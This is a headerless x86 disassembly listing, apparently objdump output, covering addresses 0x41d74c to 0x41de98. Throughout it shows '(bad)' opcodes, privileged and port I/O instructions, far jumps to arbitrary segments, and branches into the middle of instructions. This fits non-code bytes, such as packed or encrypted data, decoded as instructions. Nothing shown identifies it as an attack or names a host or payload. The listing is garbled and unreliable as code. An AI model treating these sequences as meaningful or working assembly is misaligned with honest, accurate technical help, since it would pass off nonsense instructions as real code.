  41d74c:	loop   0x41d786
  41d74e:	mov    eax,0x939e7b1
  41d753:	cmp    BYTE PTR ds:0xc4f35644,bl
  41d759:	pushf  
  41d75a:	jmp    0x41d79d
  41d75c:	pop    ds
  41d75d:	jecxz  0x41d709
  41d75f:	pop    eax
  41d760:	stos   BYTE PTR es:[edi],al
  41d761:	jnp    0x41d7a9
  41d763:	rcl    BYTE PTR [ebp+0x75],0xc8
  41d767:	outs   dx,DWORD PTR ds:[esi]
  41d768:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d769:	imul   DWORD PTR [edx+0x6e49fe3b]
  41d76f:	scas   al,BYTE PTR es:[edi]
  41d770:	xor    al,0xec
  41d772:	jp     0x41d776
  41d774:	shl    BYTE PTR [eax-0x76e2a616],0xf4
  41d77b:	xchg   DWORD PTR [ebp-0x51],ebx
  41d77e:	loope  0x41d7b6
  41d780:	push   ebp
  41d781:	repz test al,0x51
  41d784:	pop    eax
  41d785:	xchg   ebp,eax
  41d786:	mov    bh,0x71
  41d788:	imul   eax,eax,0xffffff9c
  41d78b:	fidiv  WORD PTR [edx-0x4]
  41d78e:	sbb    BYTE PTR [edx-0x1d],bl
  41d791:	loop   0x41d7af
  41d793:	or     DWORD PTR ds:[edi],edx
  41d796:	imul   edi,DWORD PTR [esp+ebx*8],0xdb2c8e90
  41d79d:	test   eax,0xed5f9efe
  41d7a2:	jl     0x41d738
  41d7a4:	shr    cl,cl
  41d7a6:	lods   al,BYTE PTR ds:[esi]
  41d7a7:	rcr    BYTE PTR [esi+0x2ddd41c7],1
  41d7ad:	or     esi,ecx
  41d7af:	adc    ebx,esp
  41d7b1:	fsub   QWORD PTR [esi*1+0x2604beb9]
  41d7b8:	ins    DWORD PTR es:[edi],dx
  41d7b9:	hlt    
  41d7ba:	adc    BYTE PTR [edx-0x62],al
  41d7bd:	cmp    eax,0x512675a
  41d7c2:	mov    dh,0xe9
  41d7c4:	add    cl,dh
  41d7c6:	or     al,0xb0
  41d7c8:	pop    esi
  41d7c9:	dec    ebp
  41d7ca:	and    DWORD PTR ds:0x81aa5588,eax
  41d7d0:	and    BYTE PTR [eax-0x50bf4453],ch
  41d7d6:	and    eax,0xe044a246
  41d7db:	loope  0x41d796
  41d7dd:	sti    
  41d7de:	les    edi,FWORD PTR [ecx-0x36]
  41d7e1:	(bad)  
  41d7e2:	inc    BYTE PTR [edx]
  41d7e4:	bound  edx,QWORD PTR [edx-0x59461e8b]
  41d7ea:	test   al,0x8c
  41d7ec:	rcl    BYTE PTR cs:[eax-0x6446fedb],1
  41d7f3:	jg     0x41d7e1
  41d7f5:	mov    edx,0x5a813ce0
  41d7fa:	in     eax,dx
  41d7fb:	sbb    eax,0xe98249ca
  41d800:	stc    
  41d801:	cmp    eax,0x695c7b0f
  41d806:	adc    al,0xb6
  41d808:	pop    ebp
  41d809:	(bad)  
  41d80b:	and    BYTE PTR [edx-0x1e86901f],dl
  41d811:	sub    cl,ch
  41d813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d814:	push   edx
  41d815:	jns    0x41d7c1
  41d817:	pop    esi
  41d818:	sbb    BYTE PTR [ecx+eiz*8-0xe66d57e],dh
  41d81f:	loop   0x41d842
  41d821:	push   es
  41d822:	hlt    
  41d823:	push   eax
  41d824:	xlat   BYTE PTR ds:[ebx]
  41d825:	lods   eax,DWORD PTR ds:[esi]
  41d826:	mov    al,0xc1
  41d828:	stos   DWORD PTR es:[edi],eax
  41d829:	test   DWORD PTR [eax+0x16164547],ebp
  41d82f:	inc    eax
  41d830:	jl     0x41d81d
  41d832:	jp     0x41d82e
  41d834:	(bad)  
  41d835:	jl     0x41d86a
  41d837:	je     0x41d854
  41d839:	xor    al,0x23
  41d83b:	fstp   QWORD PTR [ecx+ebx*1-0x38]
  41d83f:	test   al,0x6b
  41d841:	repz into 
  41d843:	mov    ebp,0xa0df2f26
  41d848:	loop   0x41d7cc
  41d84a:	arpl   WORD PTR [edi],ax
  41d84c:	das    
  41d84d:	sub    ebp,DWORD PTR [bp+si]
  41d850:	mov    bl,0xcd
  41d852:	mov    ebp,eax
  41d854:	xlat   BYTE PTR ds:[ebx]
  41d855:	pop    ebx
  41d856:	push   0xe6edd3d2
  41d85b:	sbb    al,0x4a
  41d85d:	out    dx,al
  41d85e:	(bad)  
  41d85f:	test   DWORD PTR [edi+0x1f],0x2f69c8f4
  41d866:	rcl    dl,0xc1
  41d869:	aad    0xbb
  41d86b:	(bad)  
  41d86c:	mov    ch,BYTE PTR [ebp-0xc]
  41d86f:	cmp    ch,bh
  41d871:	adc    al,bh
  41d873:	clc    
  41d874:	xor    BYTE PTR [ebp+0x48b9daf9],bl
  41d87a:	jmp    0x41d886
  41d87c:	mov    DWORD PTR [esi],esp
  41d87e:	mov    esp,0xba296bd8
  41d883:	stos   BYTE PTR es:[edi],al
  41d884:	int    0x3b
  41d886:	dec    ebx
  41d887:	sti    
  41d888:	lods   al,BYTE PTR ds:[esi]
  41d889:	in     eax,dx
  41d88a:	ss dec esi
  41d88c:	ret    
  41d88d:	fisub  WORD PTR [ecx]
  41d88f:	and    dl,BYTE PTR [ecx-0x6f5fb292]
  41d895:	out    dx,al
  41d896:	fwait
  41d897:	arpl   WORD PTR [eax-0x53],bx
  41d89a:	cli    
  41d89b:	scas   al,BYTE PTR es:[edi]
  41d89c:	jmp    0x27e:0x630d8e41
  41d8a3:	cwde   
  41d8a4:	dec    ecx
  41d8a5:	add    BYTE PTR [edx-0x5c],al
  41d8a8:	mov    ds:0x7dd7398,al
  41d8ad:	repz push esp
  41d8af:	aaa    
  41d8b0:	xchg   edx,eax
  41d8b1:	mov    ch,BYTE PTR [ebx-0x7d8e0cbb]
  41d8b7:	cmp    al,0x24
  41d8b9:	hlt    
  41d8ba:	pop    ebx
  41d8bb:	mov    ebp,0x26cf3f40
  41d8c0:	pushf  
  41d8c1:	data16 sub ch,BYTE PTR [esi+0xd]
  41d8c5:	push   ebx
  41d8c6:	mov    ds:0xbbd30450,eax
  41d8cb:	shr    edx,0x86
  41d8ce:	mov    edi,0xad955a8a
  41d8d3:	dec    eax
  41d8d4:	into   
  41d8d5:	popf   
  41d8d6:	dec    esi
  41d8d7:	pop    ebx
  41d8d8:	mov    esi,0xf77c561b
  41d8dd:	xchg   edi,eax
  41d8de:	sub    edx,esp
  41d8e0:	mov    eax,ds:0x353d5ef
  41d8e5:	sub    ch,BYTE PTR [ebx]
  41d8e7:	mov    bh,0xb9
  41d8e9:	aam    0x68
  41d8eb:	pop    edx
  41d8ec:	pop    edx
  41d8ed:	aas    
  41d8ee:	push   esi
  41d8ef:	xchg   BYTE PTR [ecx-0x25],dl
  41d8f2:	ja     0x41d8a4
  41d8f4:	mov    bh,0xa4
  41d8f6:	push   cs
  41d8f7:	(bad)  
  41d8f8:	jno    0x41d943
  41d8fa:	mov    dl,0x9
  41d8fc:	ret    
  41d8fd:	xchg   ebp,eax
  41d8fe:	xor    DWORD PTR [esi],ebp
  41d900:	mov    bl,0x20
  41d902:	dec    ecx
  41d903:	in     al,0xd3
  41d905:	adc    eax,0xf8a84e88
  41d90a:	adc    BYTE PTR [edx+0x5b],bl
  41d90d:	dec    ebx
  41d90e:	daa    
  41d90f:	stos   BYTE PTR es:[edi],al
  41d910:	push   ebp
  41d911:	mov    eax,0xcb910016
  41d916:	fdiv   DWORD PTR [ebp-0x162925db]
  41d91c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d91d:	sbb    DWORD PTR [ebp-0x432e72b2],ecx
  41d923:	push   ecx
  41d924:	retf   
  41d925:	imul   ecx,DWORD PTR [ebx],0xe7ed4796
  41d92b:	jno    0x41d91f
  41d92d:	rcl    DWORD PTR [esi+edx*1-0x11],1
  41d931:	push   es
  41d932:	add    BYTE PTR [eax-0x49],bl
  41d935:	aad    0x57
  41d937:	push   ds
  41d938:	pop    eax
  41d939:	xor    esi,DWORD PTR [eax+eiz*1-0x644ef7cb]
  41d940:	add    DWORD PTR [ecx+eax*8+0xe],esi
  41d944:	xor    edx,DWORD PTR [eax-0x42]
  41d947:	out    dx,al
  41d948:	retf   
  41d949:	sbb    DWORD PTR ds:0x7d9d18f6,esp
  41d94f:	push   ebx
  41d950:	dec    ebp
  41d951:	test   DWORD PTR [esi-0x3c5dd9f1],edx
  41d957:	retf   
  41d958:	xchg   edi,eax
  41d959:	cmp    al,dh
  41d95b:	imul   edx,DWORD PTR [edi-0x68],0x81564a37
  41d962:	aas    
  41d963:	add    dl,BYTE PTR [ebx]
  41d965:	mov    edx,0xb351ccf
  41d96a:	or     DWORD PTR [eax],ecx
  41d96c:	outs   dx,BYTE PTR ds:[esi]
  41d96d:	retf   0xe33
  41d970:	out    dx,eax
  41d971:	js     0x41d983
  41d973:	add    cl,BYTE PTR [esi]
  41d975:	dec    edx
  41d976:	xor    esp,esp
  41d978:	jnp    0x41d96d
  41d97a:	and    esp,DWORD PTR [edi+eax*8]
  41d97d:	and    ah,ch
  41d97f:	jl     0x41d906
  41d981:	add    eax,0xff74b238
  41d986:	popa   
  41d987:	arpl   WORD PTR [edx],bx
  41d989:	jmp    0x35b7:0x13356d76
  41d990:	mov    eax,0x57cd7548
  41d995:	in     al,0x9d
  41d997:	xchg   edi,eax
  41d998:	test   ah,al
  41d99a:	js     0x41d92d
  41d99c:	scas   eax,DWORD PTR es:[edi]
  41d99d:	test   DWORD PTR [edx+eiz*8],edi
  41d9a0:	dec    esp
  41d9a1:	push   0x59
  41d9a3:	or     DWORD PTR [ebp+0x5988f9e6],esi
  41d9a9:	push   ds
  41d9aa:	sbb    ebp,DWORD PTR [ebx+0x25]
  41d9ad:	loopne 0x41da0d
  41d9af:	std    
  41d9b0:	dec    edi
  41d9b1:	mov    dl,0x7d
  41d9b3:	fisttp DWORD PTR [edx-0x52]
  41d9b6:	shl    BYTE PTR [eax-0x3a],1
  41d9b9:	jmp    0x41d93c
  41d9bb:	cmc    
  41d9bc:	cwde   
  41d9bd:	addr16 push 0x8055f6b8
  41d9c3:	into   
  41d9c4:	pop    eax
  41d9c5:	mov    ecx,0xbfca4062
  41d9ca:	pop    ecx
  41d9cb:	xchg   ebx,eax
  41d9cc:	pushf  
  41d9cd:	int3   
  41d9ce:	fwait
  41d9cf:	rcr    DWORD PTR fs:[ecx],0x35
  41d9d3:	mov    ecx,0xa3572b7b
  41d9d8:	scas   al,BYTE PTR es:[edi]
  41d9d9:	lea    edi,[edi]
  41d9db:	int3   
  41d9dc:	leave  
  41d9dd:	stos   DWORD PTR es:[edi],eax
  41d9de:	sbb    DWORD PTR [edx-0x18],0xb903f4bd
  41d9e5:	and    bh,BYTE PTR [ecx+0x27]
  41d9e8:	jp     0x41d973
  41d9ea:	jo     0x41d9c7
  41d9ec:	xchg   ebx,eax
  41d9ed:	dec    ebp
  41d9ee:	popf   
  41d9ef:	aas    
  41d9f0:	es jl  0x41da40
  41d9f3:	jl     0x41da17
  41d9f5:	adc    dh,BYTE PTR [ebp+0x57d20aa]
  41d9fb:	jg     0x41d9c6
  41d9fd:	and    al,0x50
  41d9ff:	cli    
  41da00:	in     eax,dx
  41da01:	and    al,0x28
  41da03:	stc    
  41da04:	mov    DWORD PTR [edx+0x2be45096],esp
  41da0a:	das    
  41da0b:	data16 jmp 0x41d9dc
  41da0e:	cdq    
  41da0f:	daa    
  41da10:	push   ecx
  41da11:	sub    al,0x3
  41da13:	add    BYTE PTR [esi-0x71],0xc4
  41da17:	and    DWORD PTR [edx-0x340430c3],edi
  41da1d:	dec    ebp
  41da1e:	jmp    0x41d9eb
  41da20:	xchg   DWORD PTR [edx+0x7d],edi
  41da23:	loop   0x41da66
  41da25:	fsubp  st(1),st
  41da27:	mov    eax,ds:0x249830e1
  41da2c:	sbb    al,0xdd
  41da2e:	push   es
  41da2f:	in     al,dx
  41da30:	bound  eax,QWORD PTR [eax]
  41da32:	mov    BYTE PTR [edi],bl
  41da34:	pop    ds
  41da35:	scas   eax,DWORD PTR es:[edi]
  41da36:	out    dx,al
  41da37:	inc    ecx
  41da38:	xchg   DWORD PTR [ebx+0x30845779],esp
  41da3e:	mov    DWORD PTR [edi],edx
  41da40:	stos   DWORD PTR es:[edi],eax
  41da41:	and    bl,BYTE PTR [ecx+0x6b788a87]
  41da47:	push   esp
  41da48:	cmp    eax,0x5420e497
  41da4d:	or     al,0x4a
  41da4f:	cmp    ebp,esp
  41da51:	or     DWORD PTR [eax],ebx
  41da53:	addr16 push eax
  41da55:	adc    DWORD PTR [ecx+0x6e],0x2270aeed
  41da5c:	mov    eax,ds:0xe9f0743b
  41da61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da62:	fld    QWORD PTR [eax-0x1c0faf67]
  41da68:	push   0x64
  41da6a:	add    cl,bl
  41da6c:	sub    BYTE PTR ds:0xe5f10d2,bl
  41da72:	mov    dl,BYTE PTR [edi]
  41da74:	popa   
  41da75:	jmp    0x3fda:0x39af61b0
  41da7c:	test   al,0xd2
  41da7e:	retf   0x96b0
  41da81:	pop    eax
  41da82:	adc    BYTE PTR [edi-0x39bf49a1],bl
  41da88:	jl     0x41da43
  41da8a:	mov    ebx,edi
  41da8c:	(bad)  
  41da8d:	mov    esi,0xaee256e4
  41da92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da93:	enter  0x4c,0x94
  41da97:	sbb    bh,0xf0
  41da9a:	dec    edi
  41da9b:	cmp    DWORD PTR [edx],ecx
  41da9d:	jo     0x41db15
  41da9f:	xchg   esp,eax
  41daa0:	ds jl  0x41da5e
  41daa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41daa4:	mov    edx,0xebf9b4e4
  41daa9:	lea    ebx,[eax+esi*2-0x2da6cb5e]
  41dab0:	out    dx,eax
  41dab1:	call   0x327f47df
  41dab6:	dec    esi
  41dab7:	pop    edx
  41dab8:	outs   dx,DWORD PTR ds:[esi]
  41dab9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41daba:	xor    BYTE PTR [edx+0x2d],al
  41dabd:	pop    ebp
  41dabe:	loopne 0x41db2d
  41dac0:	test   BYTE PTR [ebx+0x351425e8],bh
  41dac6:	adc    ebx,DWORD PTR [eax-0x23]
  41dac9:	lea    edi,[esi+ebx*4]
  41dacc:	mov    ah,0xee
  41dace:	pop    ebx
  41dacf:	xchg   ebx,eax
  41dad0:	bound  edx,QWORD PTR [esi+0x5c]
  41dad3:	sbb    BYTE PTR [ebx+0x42],bl
  41dad6:	jnp    0x41da7f
  41dad8:	out    dx,al
  41dad9:	ins    BYTE PTR es:[edi],dx
  41dada:	mov    ds:0x95127c68,eax
  41dadf:	mov    ?,esp
  41dae1:	or     DWORD PTR [edi+0x76],ecx
  41dae4:	cmp    DWORD PTR [eax],esp
  41dae6:	and    DWORD PTR ds:[ecx+0x6d1c4fe4],edx
  41daed:	in     eax,dx
  41daee:	adc    DWORD PTR [ecx],ecx
  41daf0:	cmp    al,0xee
  41daf2:	mov    esp,0xf04a7171
  41daf7:	mov    esi,0x473202e3
  41dafc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dafd:	add    DWORD PTR [ecx+0x51],esp
  41db00:	loop   0x41db5c
  41db02:	outs   dx,BYTE PTR ds:[esi]
  41db03:	add    eax,0x215d6bea
  41db08:	xchg   edi,eax
  41db09:	mov    esi,0x21c69b2f
  41db0e:	out    dx,eax
  41db0f:	mov    ?,edx
  41db11:	xchg   di,ax
  41db13:	or     DWORD PTR [ebx-0x15baa75a],edi
  41db19:	xchg   BYTE PTR [edx-0x29],al
  41db1c:	ror    ecx,1
  41db1e:	push   0xffffffba
  41db20:	pop    ecx
  41db21:	data16 sub ch,bh
  41db24:	sbb    eax,0xb25705e8
  41db29:	and    eax,0xacf3e097
  41db2e:	into   
  41db2f:	clc    
  41db30:	and    cl,BYTE PTR [edx]
  41db32:	lods   al,BYTE PTR ds:[esi]
  41db33:	dec    edx
  41db34:	or     ah,al
  41db36:	push   ebp
  41db37:	jnp    0x41db6a
  41db39:	imul   ebx,eax,0x9d06d21c
  41db3f:	call   0xdb040c96
  41db44:	mov    ch,0x62
  41db46:	jo     0x41dbba
  41db48:	mov    bh,0xae
  41db4a:	scas   al,BYTE PTR es:[edi]
  41db4b:	and    al,0x26
  41db4d:	mov    eax,ds:0xad40a548
  41db52:	mov    edx,0x53aedb7c
  41db57:	loope  0x41dbab
  41db59:	dec    eax
  41db5a:	sbb    esp,DWORD PTR [edx]
  41db5c:	dec    edx
  41db5d:	lahf   
  41db5e:	mov    eax,ds:0x761f40ef
  41db63:	mov    cl,0xba
  41db65:	repnz nop
  41db67:	adc    BYTE PTR [ebx-0xd],dh
  41db6a:	dec    ebp
  41db6b:	lar    esi,WORD PTR [esi-0x1c13ea58]
  41db72:	mov    eax,0x6c750f85
  41db77:	cld    
  41db78:	arpl   WORD PTR [esi-0x6d74f433],bp
  41db7e:	bnd ret 
  41db80:	adc    bh,dl
  41db82:	add    esp,DWORD PTR [ebp+0x75]
  41db85:	and    BYTE PTR [ecx],dh
  41db87:	sar    DWORD PTR [edi+0x1b],0x8b
  41db8b:	pop    es
  41db8c:	test   eax,0xa6ee2351
  41db91:	gs push edi
  41db93:	lds    ebx,FWORD PTR [edi-0x3e]
  41db96:	mov    ch,BYTE PTR [ebx+0x5436caa9]
  41db9c:	ror    BYTE PTR [edx+0xbde2b54],0x35
  41dba3:	test   eax,0x36ca769d
  41dba8:	jecxz  0x41dc29
  41dbaa:	ret    0x3aaf
  41dbad:	loop   0x41db97
  41dbaf:	xchg   ecx,eax
  41dbb0:	inc    edx
  41dbb1:	ror    BYTE PTR [ecx],cl
  41dbb3:	mov    ds:0x565b7a84,eax
  41dbb8:	sbb    al,bh
  41dbba:	add    dl,ch
  41dbbc:	into   
  41dbbd:	sub    al,0x3d
  41dbbf:	mov    ah,0xc
  41dbc1:	cmp    BYTE PTR [edi],bh
  41dbc3:	pop    ds
  41dbc4:	(bad)  
  41dbc5:	lods   al,BYTE PTR ds:[esi]
  41dbc6:	in     eax,dx
  41dbc7:	retf   
  41dbc8:	xchg   ecx,eax
  41dbc9:	jbe    0x41db6c
  41dbcb:	mov    bh,0xc3
  41dbcd:	push   edx
  41dbce:	or     ebp,DWORD PTR es:[esi-0x655a3765]
  41dbd5:	std    
  41dbd6:	inc    esp
  41dbd7:	outs   dx,DWORD PTR ds:[esi]
  41dbd8:	ins    DWORD PTR es:[edi],dx
  41dbd9:	pop    ecx
  41dbda:	sub    ah,bl
  41dbdc:	xor    al,0x59
  41dbde:	or     DWORD PTR [ebx-0x4023038c],ecx
  41dbe4:	imul   eax,DWORD PTR [esi-0x71],0x75e3e967
  41dbeb:	sub    ah,0x51
  41dbee:	mov    ds:0x692b978f,al
  41dbf3:	in     eax,0x4b
  41dbf5:	push   edi
  41dbf6:	sbb    eax,0xf1b5b798
  41dbfb:	pop    ecx
  41dbfc:	jp     0x41dbd8
  41dbfe:	std    
  41dbff:	int3   
  41dc00:	push   0x4f
  41dc02:	fsub   QWORD PTR [esi+0x51]
  41dc05:	dec    ecx
  41dc06:	or     eax,0xb352d535
  41dc0b:	enter  0x3dd2,0xde
  41dc0f:	into   
  41dc10:	mov    ebx,0x2564ef14
  41dc15:	add    eax,0x61b3d108
  41dc1a:	jo     0x41dc33
  41dc1c:	jnp    0x41dbc3
  41dc1e:	and    al,0x24
  41dc20:	xor    dh,bh
  41dc22:	out    dx,eax
  41dc23:	dec    ebx
  41dc24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc25:	jmp    0xb7b9:0xfc16c4e2
  41dc2c:	mov    ds:0x571a3338,eax
  41dc31:	inc    eax
  41dc32:	cmp    DWORD PTR [edi+0x24],ecx
  41dc35:	xchg   ebx,eax
  41dc36:	lock ret 0x612f
  41dc3a:	push   ss
  41dc3b:	ins    DWORD PTR es:[edi],dx
  41dc3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc3d:	and    ecx,DWORD PTR [eax+edx*8]
  41dc40:	out    dx,eax
  41dc41:	enter  0xb07e,0xa3
  41dc45:	mov    eax,ds:0x9122735d
  41dc4a:	xchg   ecx,eax
  41dc4b:	inc    esp
  41dc4c:	(bad)  
  41dc4d:	repz inc edx
  41dc4f:	mov    ch,0x5c
  41dc51:	xchg   ebx,eax
  41dc52:	mov    ah,0x1c
  41dc54:	xor    BYTE PTR [edx+ebp*2+0xfd3c957],0x9a
  41dc5c:	sbb    cl,ch
  41dc5e:	retf   
  41dc5f:	inc    eax
  41dc60:	xchg   ebx,eax
  41dc61:	pop    ebx
  41dc62:	aad    0x1b
  41dc64:	xor    edx,edx
  41dc66:	aaa    
  41dc67:	arpl   WORD PTR [eax],dx
  41dc69:	ret    0x80a9
  41dc6c:	jmp    0xb4ae0d2
  41dc71:	adc    DWORD PTR [edx+ebx*8-0x69],ebp
  41dc75:	jle    0x41dcec
  41dc77:	(bad)  
  41dc78:	repz jae 0x41dc14
  41dc7b:	ds cli 
  41dc7d:	sbb    al,0x68
  41dc7f:	pop    ss
  41dc80:	sbb    bl,dh
  41dc82:	sbb    cl,BYTE PTR [eax-0x549400d3]
  41dc88:	shl    DWORD PTR [ecx-0x1c4fc695],cl
  41dc8e:	cli    
  41dc8f:	jns    0x41dca6
  41dc91:	ins    BYTE PTR es:[edi],dx
  41dc92:	jl     0x41dcfa
  41dc94:	sbb    al,BYTE PTR [ecx+0x6e]
  41dc97:	sbb    eax,0x98bce988
  41dc9c:	or     ecx,DWORD PTR [ebx+0x49]
  41dc9f:	xor    DWORD PTR [edx+0x7cb1fb9f],edx
  41dca5:	mov    dl,0xb9
  41dca7:	add    BYTE PTR [esi-0x7c1bdc0c],ch
  41dcad:	arpl   WORD PTR [edi+0x575a8f7c],bx
  41dcb3:	cdq    
  41dcb4:	cmp    BYTE PTR [eax],ah
  41dcb6:	cld    
  41dcb7:	mov    al,0x4c
  41dcb9:	xchg   DWORD PTR [ecx+esi*2-0x38a241d8],edx
  41dcc0:	push   0x39
  41dcc2:	sub    DWORD PTR ds:0xd1834da,eax
  41dcc8:	sub    eax,eax
  41dcca:	clc    
  41dccb:	push   eax
  41dccc:	pushf  
  41dccd:	dec    edi
  41dcce:	leave  
  41dccf:	pop    ebx
  41dcd0:	mov    esi,0xfec7ecb7
  41dcd5:	cmc    
  41dcd6:	push   esi
  41dcd7:	mov    eax,ds:0x78dab808
  41dcdc:	stos   DWORD PTR es:[edi],eax
  41dcdd:	mov    ecx,DWORD PTR [edi+0x586848d7]
  41dce3:	mov    cl,0x8e
  41dce5:	test   BYTE PTR [ebx+eiz*4+0x66ff219],ah
  41dcec:	xchg   ebx,eax
  41dced:	int3   
  41dcee:	(bad)  
  41dcef:	repnz stos DWORD PTR es:[edi],eax
  41dcf1:	int    0x78
  41dcf3:	xor    DWORD PTR [eax+ecx*2+0x59],eax
  41dcf7:	dec    esp
  41dcf8:	icebp  
  41dcf9:	mov    ch,0xef
  41dcfb:	inc    edx
  41dcfc:	cwde   
  41dcfd:	stos   BYTE PTR es:[edi],al
  41dcfe:	sbb    eax,0x9d7345a3
  41dd03:	in     al,dx
  41dd04:	pop    ss
  41dd05:	dec    edx
  41dd06:	in     eax,0xc8
  41dd08:	inc    ebp
  41dd09:	stos   BYTE PTR es:[edi],al
  41dd0a:	inc    eax
  41dd0b:	fmul   QWORD PTR [edi]
  41dd0d:	add    cl,BYTE PTR [ebp-0x79a0bd14]
  41dd13:	(bad)  
  41dd15:	jbe    0x41dc9d
  41dd17:	iret   
  41dd18:	adc    cl,cl
  41dd1a:	dec    esp
  41dd1b:	test   eax,0xcc917136
  41dd20:	sub    al,0x9e
  41dd22:	sub    al,0x85
  41dd24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd25:	dec    ebp
  41dd26:	sbb    eax,0x2142b5cf
  41dd2b:	imul   edx,DWORD PTR [ebp-0x17af397e],0xffffffc8
  41dd32:	neg    DWORD PTR [ebp-0x79]
  41dd35:	setp   BYTE PTR [ebx]
  41dd38:	push   ebp
  41dd39:	int    0xc9
  41dd3b:	loope  0x41dda0
  41dd3d:	jmp    0x41dd70
  41dd3f:	pop    esp
  41dd40:	mov    dl,0x7d
  41dd42:	sbb    eax,0x3e171e6e
  41dd47:	or     BYTE PTR fs:[edx+0x29a1a7d],0x3f
  41dd4f:	loopne 0x41dd97
  41dd51:	mov    ecx,0xaba6717c
  41dd56:	jmp    0x7a61f8bf
  41dd5b:	pop    ds
  41dd5c:	push   cs
  41dd5d:	fimul  WORD PTR ds:0xc7eb0d4d
  41dd63:	mov    BYTE PTR [edi+0x18],ch
  41dd66:	dec    ebx
  41dd67:	adc    ch,BYTE PTR [edx+0x5b]
  41dd6a:	es and eax,0xe73aad70
  41dd70:	xor    dl,BYTE PTR [ebx+0x7971d390]
  41dd76:	mov    esi,0x78160565
  41dd7b:	adc    DWORD PTR [ebp-0x9],esi
  41dd7e:	push   edi
  41dd7f:	dec    eax
  41dd80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd81:	sbb    DWORD PTR [eax+0x18886445],edi
  41dd87:	pusha  
  41dd88:	es sub eax,0xe5dcf084
  41dd8e:	adc    eax,0x2bbd51aa
  41dd93:	xor    BYTE PTR [ebp+0x2d4649b4],dh
  41dd99:	xchg   edx,eax
  41dd9a:	mov    ch,0x37
  41dd9c:	lahf   
  41dd9d:	cmp    al,0xd0
  41dd9f:	add    esp,ecx
  41dda1:	mov    BYTE PTR fs:[ebx+0x6c],bl
  41dda5:	inc    ebp
  41dda6:	pop    ecx
  41dda7:	stc    
  41dda8:	nop
  41dda9:	sahf   
  41ddaa:	repnz pop ss
  41ddac:	ret    
  41ddad:	pop    ds
  41ddae:	stos   DWORD PTR es:[edi],eax
  41ddaf:	fs sub al,0xeb
  41ddb2:	inc    esi
  41ddb3:	iret   
  41ddb4:	and    edx,DWORD PTR [eax-0x58533601]
  41ddba:	mov    BYTE PTR [esp+ebp*1-0x69],ch
  41ddbe:	(bad)  
  41ddbf:	push   ebx
  41ddc0:	jnp    0x41dd5f
  41ddc2:	rcl    bh,1
  41ddc4:	es pop ebx
  41ddc6:	arpl   WORD PTR [ebp-0x17459c93],sp
  41ddcc:	stos   DWORD PTR es:[edi],eax
  41ddcd:	test   al,0x44
  41ddcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddd0:	inc    DWORD PTR [edi]
  41ddd2:	cmp    ecx,edx
  41ddd4:	fadd   st(2),st
  41ddd6:	aas    
  41ddd7:	pop    eax
  41ddd8:	stc    
  41ddd9:	popa   
  41ddda:	xchg   DWORD PTR [eax+0xf],esp
  41dddd:	mov    ch,0xb7
  41dddf:	mov    al,0x4
  41dde1:	lods   eax,DWORD PTR ds:[esi]
  41dde2:	cmp    eax,0xcd1eebc9
  41dde7:	lock sub BYTE PTR [ecx],bl
  41ddea:	cmp    al,BYTE PTR ds:0xd2f8d6e1
  41ddf0:	repnz rol DWORD PTR [ecx+ecx*4-0xa],0x5b
  41ddf6:	lods   al,BYTE PTR ds:[esi]
  41ddf7:	mov    dh,0x95
  41ddf9:	scas   al,BYTE PTR es:[edi]
  41ddfa:	outs   dx,BYTE PTR ds:[esi]
  41ddfb:	iret   
  41ddfc:	icebp  
  41ddfd:	mov    eax,ds:0xbd182327
  41de02:	aas    
  41de03:	(bad)  
  41de04:	(bad)  ds:0x6e465a0d
  41de0a:	loop   0x41de77
  41de0c:	shr    ah,cl
  41de0e:	mov    esp,es
  41de10:	mov    esp,0xb34691c2
  41de15:	mov    al,ds:0x34ebc3e9
  41de1a:	mov    ds:0x8b67a741,al
  41de1f:	(bad)  
  41de21:	and    DWORD PTR [edi],eax
  41de23:	leave  
  41de24:	dec    ebx
  41de25:	sahf   
  41de26:	rol    BYTE PTR [edi+esi*1-0x35],0x4b
  41de2b:	into   
  41de2c:	mov    ebp,0x97f5063a
  41de31:	or     BYTE PTR [ebp+ebx*4+0x3c6ed416],al
  41de38:	push   0xffffff96
  41de3a:	mov    esi,0x3bbd84da
  41de3f:	loope  0x41de1a
  41de41:	mov    ss,WORD PTR [eax]
  41de43:	push   edi
  41de44:	xor    DWORD PTR [esi+0x3736eab3],edi
  41de4a:	mov    DWORD PTR [edi+0x11],edx
  41de4d:	or     eax,0x4721a4ce
  41de52:	popf   
  41de53:	ins    BYTE PTR es:[edi],dx
  41de54:	sub    eax,0x4d1518b3
  41de59:	mov    ds:0x125db372,eax
  41de5e:	inc    esp
  41de5f:	loope  0x41de57
  41de61:	adc    BYTE PTR [ecx-0x7c],dl
  41de64:	out    0x53,al
  41de66:	outs   dx,DWORD PTR ds:[esi]
  41de67:	jecxz  0x41de39
  41de69:	sti    
  41de6a:	inc    esp
  41de6b:	sbb    BYTE PTR [ebx+0x20],ah
  41de6e:	scas   eax,DWORD PTR es:[edi]
  41de6f:	data16 jo 0x41de72
  41de72:	cwde   
  41de73:	sahf   
  41de74:	test   DWORD PTR ss:[eax+esi*1-0x66],edi
  41de79:	pushf  
  41de7a:	jl     0x41de27
  41de7c:	aam    0x6d
  41de7e:	dec    eax
  41de7f:	pop    ss
  41de80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de81:	cmc    
  41de82:	ja     0x41dee8
  41de84:	fiadd  DWORD PTR [eax+0x425d295]
  41de8a:	rcr    ecx,1
  41de8c:	aad    0x6
  41de8e:	xchg   BYTE PTR [ebp-0x6e],cl
  41de91:	jg     0x41debf
  41de93:	outs   dx,DWORD PTR ds:[esi]
  41de94:	pop    esp
  41de95:	lahf   
  41de96:	or     bl,cl
  41de98:	or     eax,0xa42d8769
